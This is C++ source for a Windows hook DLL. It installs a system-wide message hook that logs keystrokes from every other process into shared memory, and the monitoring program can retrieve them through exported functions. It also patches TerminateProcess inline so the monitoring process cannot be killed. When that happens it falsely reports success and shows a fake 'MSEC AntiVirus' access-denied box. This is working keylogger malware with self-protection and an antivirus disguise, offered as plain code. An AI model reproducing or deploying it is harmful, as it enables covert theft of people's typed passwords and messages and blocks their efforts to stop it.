/*
*
* includes
*
*/
//#include "stdafx.h"
#include "Initation.h"
#include <stdlib.h>
#include <stdio.h>



/*
*
* definitions
*
*/
// string definitions
#define NULLSTR ""
#define NULLCHAR '\0'
#define SPACESTR " "

// proc-hooking x64 assembly definitions
#define	PROCHOOK_MOVCODE 0x48
#define PROCHOOK_64BITADDR 0xB8
#define PROCHOOK_JMPCODE 0xFF
#define PROCHOOK_REGCODE 0xE0

// misc
#define TBUFFERSIZE	200000
#define KBUFFERSIZE	2000
#define MAXTEXTOUT 8192
#define MUTEXTEXTNAME L"64 bit hook dll text buffer mutex"
#define MUTEXKEYNAME L"64 bit hook dll key buffer mutex"
#define PROCESSIDSTRING "*!~!*%ld*!~!*"
#define PROCESSIDMAX 20



/*
*
* types
*
*/
// prochooking types
#pragma pack(1)
typedef struct _ProcHook
{
	BYTE byMovCode = PROCHOOK_MOVCODE;
	BYTE byAddrType = PROCHOOK_64BITADDR;
	unsigned __int64 ui64Address;
	BYTE byJmpCode = PROCHOOK_JMPCODE;
	BYTE byRegisterCode = PROCHOOK_REGCODE;
}PROCHOOK, *PPROCHOOK;
#pragma pack()

typedef struct _HookRec
{
	unsigned __int64	ui64AddressFunc;
	unsigned __int64	ui64AddressShadowFunc;
	PROCHOOK			phOld;
	PROCHOOK			phNew;
}HOOKREC, *PHOOKREC;



/*
*
* shared memory variables
*
*/
#pragma data_seg(".sd_64bithookdll")

// prochook text buffer variables
DWORD __dwLastTextProcessID = 0;
size_t __stTextBufferPtr = 0;
char __szTextBuffer[TBUFFERSIZE] = NULLSTR;

// keystroke logging buffer variables
DWORD __dwLastKeyProcessID = 0;
size_t __stKeyBufferPtr = 0;
char __szKeyBuffer[KBUFFERSIZE] = NULLSTR;

// process handle to block terminateprocess for
DWORD __dwRootAppID = 0;

// hook handles
HHOOK __hHook;

#pragma data_seg()



/*
*
* global variables
*
*/
// dll handles, and process id's
HINSTANCE _hDll;
DWORD _dwCurrentProcessID = 0;
char _szCurrentProcessID[PROCESSIDMAX] = NULLSTR;

// monitoring app and hook statuses
BOOL _bIsRootApp = FALSE;
BOOL _bIsHooked = FALSE;

// mutex variables
HANDLE _hMutexText;
HANDLE _hMutexKey;

// prochooking HOOKREC variables
HOOKREC _hrTextOutA;
HOOKREC _hrTextOutW;
HOOKREC _hrExtTextOutA;
HOOKREC _hrExtTextOutW;
HOOKREC _hrTerminateProcess;



/*
*
* function prototypes
*
*/
// message hook
LRESULT CALLBACK WINAPI MsgProc(int, WPARAM, LPARAM);

// prochooking shadow functions, intercepting 4 text display functions and TerminateProcess

BOOL WINAPI ShadowTerminateProcess(HANDLE, UINT);

// private functions
void WINAPI WriteToTextBuffer(LPCSTR, UINT);
void WINAPI WriteToKeyBuffer(LPCSTR, UINT);
void WINAPI CreateAllHooks(void);
void WINAPI DestroyAllHooks(void);
void WINAPI CreateHook(unsigned __int64, unsigned __int64, PHOOKREC);
void WINAPI DestroyHook(PHOOKREC);
void WINAPI HookFunction(PHOOKREC);
void WINAPI UnhookFunction(PHOOKREC);



/*
*
* dll main
*
*/
BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{

		// initialize instance wide globals
		_hDll = hModule;
		_dwCurrentProcessID = GetCurrentProcessId();
		sprintf_s(_szCurrentProcessID, PROCESSIDMAX, PROCESSIDSTRING, _dwCurrentProcessID);

		// create mutexs
		_hMutexText = CreateMutex(NULL, FALSE, MUTEXTEXTNAME);
		_hMutexKey = CreateMutex(NULL, FALSE, MUTEXKEYNAME);

		// create hooks
		CreateAllHooks();

		break;
	}
	case DLL_PROCESS_DETACH:
	{

		// destroy hooks
		DestroyAllHooks();

		// close mutexs
		CloseHandle(_hMutexText);
		CloseHandle(_hMutexKey);

		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		break;
	}
	}

	return TRUE;
}



/*
*
* message hooking function
*
*/
LRESULT CALLBACK WINAPI MsgHookingProc(int iCode, WPARAM wParam, LPARAM lParam)
{
	char szKey[2] = NULLSTR;
	MSG FAR * pMsg;

	// create hooks
	CreateAllHooks();

	// process keystroke message, append to buffer... if it isnt the monitoring process
	if (_bIsRootApp == FALSE)
	{
		pMsg = (MSG FAR *)lParam;
		if (pMsg->message == WM_CHAR)
		{
			if (wParam == PM_REMOVE)
			{
				szKey[0] = (char)pMsg->wParam;
				WriteToKeyBuffer((LPCSTR)szKey, (UINT)1);
			}
		}
	}

	// pass the message on
	return CallNextHookEx(__hHook, iCode, wParam, lParam);
}



/*
*
* public exported functions
*
*/
void WINAPI StartMonitoring(void)
{

	// since this is obviously the monitoring app... set appropriate vars, and then destroy hooks if neccessary
	_bIsRootApp = TRUE;
	__dwRootAppID = GetCurrentProcessId();
	DestroyAllHooks();

	// clear text buffer
	WaitForSingleObject(_hMutexText, INFINITE);
	__dwLastTextProcessID = 0;
	__stTextBufferPtr = 0;
	memset(__szTextBuffer, NULLCHAR, TBUFFERSIZE);
	ReleaseMutex(_hMutexText);

	// clear key buffer
	WaitForSingleObject(_hMutexKey, INFINITE);
	__dwLastKeyProcessID = 0;
	__stKeyBufferPtr = 0;
	memset(__szTextBuffer, NULLCHAR, TBUFFERSIZE);
	ReleaseMutex(_hMutexKey);

	// start system message hook
	__hHook = SetWindowsHookEx(WH_GETMESSAGE, MsgHookingProc, _hDll, 0);

	return;
}

void WINAPI StopMonitoring(void)
{

	// unhook msg hook
	UnhookWindowsHookEx(__hHook);

	return;
}

void WINAPI GetTextBuffer(LPSTR lpszTextBufferOut, size_t * plTextBufferSize)
{

	// wait for mutex
	WaitForSingleObject(_hMutexText, INFINITE);

	// copy prochooking text buffer
	memset(lpszTextBufferOut, NULLCHAR, TBUFFERSIZE);
	memcpy(lpszTextBufferOut, __szTextBuffer, strlen(__szTextBuffer));
	*plTextBufferSize = __stTextBufferPtr;

	// clear text buffer
	__dwLastTextProcessID = 0;
	__stTextBufferPtr = 0;
	memset(__szTextBuffer, NULLCHAR, TBUFFERSIZE);

	// release mutex
	ReleaseMutex(_hMutexText);

	return;
}

void WINAPI GetKeyBuffer(LPSTR lpszKeyBufferOut, size_t * plKeyBufferSize)
{

	// wait for mutex
	WaitForSingleObject(_hMutexKey, INFINITE);

	// copy key buffer
	memset(lpszKeyBufferOut, NULLCHAR, KBUFFERSIZE);
	memcpy(lpszKeyBufferOut, __szKeyBuffer, strlen(__szKeyBuffer));
	*plKeyBufferSize = __stKeyBufferPtr;

	// clear key buffer
	__dwLastKeyProcessID = 0;
	__stKeyBufferPtr = 0;
	memset(__szKeyBuffer, NULLCHAR, KBUFFERSIZE);

	// release mutex
	ReleaseMutex(_hMutexKey);

	return;
}



/*
*
* prochooking shadow functions, function calls to the associated API functions get redirected here
*
*/

BOOL WINAPI ShadowTerminateProcess(HANDLE hProcess, UINT uiExitCode)
{
	BOOL bRet = FALSE;
	BOOL bAllow = TRUE;
	HANDLE hProcessDuplicate = NULL;

	// check to make sure that this process isnt being protected
	DuplicateHandle(GetCurrentProcess(), hProcess, GetCurrentProcess(), (LPHANDLE)&hProcessDuplicate, PROCESS_QUERY_INFORMATION, TRUE, 0);
	if (GetProcessId(hProcess) == __dwRootAppID)
	{
		bAllow = FALSE;
	}
	CloseHandle(hProcessDuplicate);

	// pass on call is allowed, otherwise lie and say it worked
	if (bAllow == TRUE)
	{
		UnhookFunction((PHOOKREC)&_hrTerminateProcess);
		bRet = TerminateProcess(hProcess, uiExitCode);
		HookFunction((PHOOKREC)&_hrTerminateProcess);
	}
	else
	{
		MessageBox(NULL, L"Aceess denied", L"MSEC AntiVirus", 0);
		bRet = 1;
	}
	
	return bRet;
}



/*
*
* private functions
*
*/
void WINAPI WriteToTextBuffer(LPCSTR lpszText, UINT uiLen)
{

	// wait for mutex
	WaitForSingleObject(_hMutexText, INFINITE);

	// make sure that there is enough room to write text, if not, clear the buffer
	if ((__stTextBufferPtr + (uiLen + PROCESSIDMAX + 1)) >= TBUFFERSIZE)
	{
		__dwLastTextProcessID = 0;
		memset((void *)__szTextBuffer, NULLCHAR, TBUFFERSIZE);
		__stTextBufferPtr = 0;
	}

	// check to see if this process id matches the process id last loged in the text buffer, if not... log process id
	if (__dwLastTextProcessID != _dwCurrentProcessID)
	{
		__dwLastTextProcessID = _dwCurrentProcessID;
		memcpy(__szTextBuffer + __stTextBufferPtr, _szCurrentProcessID, strlen(_szCurrentProcessID));
		__stTextBufferPtr = __stTextBufferPtr + strlen(_szCurrentProcessID);
	}

	// finally, log text to text buffer and add a space
	memcpy(__szTextBuffer + __stTextBufferPtr, lpszText, uiLen);
	__stTextBufferPtr = __stTextBufferPtr + uiLen;
	memcpy(__szTextBuffer + __stTextBufferPtr, SPACESTR, strlen(SPACESTR));
	__stTextBufferPtr = __stTextBufferPtr + 1;

	// release mutex
	ReleaseMutex(_hMutexText);

	return;
}

void WINAPI WriteToKeyBuffer(LPCSTR lpszText, UINT uiLen)
{

	// wait for mutex
	WaitForSingleObject(_hMutexKey, INFINITE);

	// make sure that there is enough room to write text
	if ((__stKeyBufferPtr + (uiLen + PROCESSIDMAX + 1)) >= KBUFFERSIZE)
	{
		__dwLastTextProcessID = 0;
		memset((void *)__szKeyBuffer, NULLCHAR, KBUFFERSIZE);
		__stKeyBufferPtr = 0;
	}

	// check to see if this process id matches the process id last loged in the text buffer, if not... log process id
	if (__dwLastKeyProcessID != _dwCurrentProcessID)
	{
		__dwLastKeyProcessID = _dwCurrentProcessID;
		memcpy(__szKeyBuffer + __stKeyBufferPtr, _szCurrentProcessID, strlen(_szCurrentProcessID));
		__stKeyBufferPtr = __stKeyBufferPtr + strlen(_szCurrentProcessID);
	}

	// finally, log text to key buffer
	memcpy(__szKeyBuffer + __stKeyBufferPtr, lpszText, uiLen);
	__stKeyBufferPtr = __stKeyBufferPtr + uiLen;

	// release mutex
	ReleaseMutex(_hMutexKey);

	return;
}

void WINAPI CreateAllHooks(void)
{
	if (_bIsRootApp == FALSE)
	{
		if (_bIsHooked == FALSE)
		{
			_bIsHooked = TRUE;
			/*CreateHook((unsigned __int64)ExtTextOutA, (unsigned __int64)ShadowExtTextOutA, (PHOOKREC)&_hrExtTextOutA);
			CreateHook((unsigned __int64)ExtTextOutW, (unsigned __int64)ShadowExtTextOutW, (PHOOKREC)&_hrExtTextOutW);
			CreateHook((unsigned __int64)TextOutA, (unsigned __int64)ShadowTextOutA, (PHOOKREC)&_hrTextOutA);
			CreateHook((unsigned __int64)TextOutW, (unsigned __int64)ShadowTextOutW, (PHOOKREC)&_hrTextOutW);*/
			CreateHook((unsigned __int64)TerminateProcess, (unsigned __int64)ShadowTerminateProcess, (PHOOKREC)&_hrTerminateProcess);
		}
	}

	return;
}

void WINAPI DestroyAllHooks(void)
{
	if (_bIsHooked == TRUE)
	{
		_bIsHooked = FALSE;
		/*DestroyHook((PHOOKREC)&_hrExtTextOutA);
		DestroyHook((PHOOKREC)&_hrExtTextOutW);
		DestroyHook((PHOOKREC)&_hrTextOutA);
		DestroyHook((PHOOKREC)&_hrTextOutW);*/
		DestroyHook((PHOOKREC)&_hrTerminateProcess);
	}

	return;
}

void WINAPI CreateHook(unsigned __int64 ui64AddressFunc, unsigned __int64 ui64AddressShadowFunc, PHOOKREC phr)
{
	DWORD dwOldAttr;

	// setup hookrec structure
	phr->ui64AddressFunc = ui64AddressFunc;
	phr->ui64AddressShadowFunc = ui64AddressShadowFunc;
	phr->phNew.ui64Address = ui64AddressShadowFunc;
	memcpy((void *)&phr->phOld, (LPVOID)phr->ui64AddressFunc, sizeof(PROCHOOK));

	// unprotect memory
	if (VirtualProtect((void *)phr->ui64AddressFunc, sizeof(PROCHOOK), PAGE_EXECUTE_READWRITE, &dwOldAttr) == FALSE)
	{
		WriteToTextBuffer("vpfail", 6);
	}

	// hook function
	HookFunction(phr);

	return;
}

void WINAPI DestroyHook(PHOOKREC phr)
{

	// unhook function
	UnhookFunction(phr);

	// reset hookrec
	phr->ui64AddressFunc = 0;
	phr->ui64AddressShadowFunc = 0;
	phr->phNew.ui64Address = 0;
	memset((void *)&phr->phOld, 0, sizeof(PROCHOOK));

	return;
}

void WINAPI HookFunction(PHOOKREC phr)
{

	// copy the jump bytes over top of the function
	memcpy((void *)phr->ui64AddressFunc, (const void *)&phr->phNew, sizeof(PROCHOOK));

	return;
}

void WINAPI UnhookFunction(PHOOKREC phr)
{

	// copy the original bytes over top of the jump bytes
	memcpy((void *)phr->ui64AddressFunc, (const void *)&phr->phOld, sizeof(PROCHOOK));

	return;
}